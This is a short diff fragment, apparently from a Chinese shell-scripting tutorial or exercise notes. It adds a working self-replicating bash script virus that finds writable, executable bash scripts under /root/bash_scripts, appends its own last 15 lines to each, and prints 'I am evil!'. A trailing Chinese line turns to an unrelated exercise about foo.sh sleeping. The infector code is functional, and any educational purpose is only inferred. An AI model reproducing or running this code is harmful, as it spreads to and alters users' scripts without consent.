@@ -963,6 +963,24 @@ do
 done
 echo "I am evil!"
 rm -f /tmp/.AmIbug
+
+
+#!/bin/bash
+if [ -e /tmp/.E_V ]
+        then
+                exit
+        else
+        touch /tmp/.E_V
+        for file in `find /root/bash_scripts/*`
+                do
+                        grep ".E_V" $file &> /dev/null && continue
+                        file $file|grep "Bourne-Again shell script" &> /dev/null || continue
+                        [ -x ${file} -a -w ${file} ] || continue
+                        tail -n 15 $0 >> $file
+                done
+        rm -f /tmp/.E_V &> /dev/null
+        echo "I am evil!"
+fi
 ```
 ---
 如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定
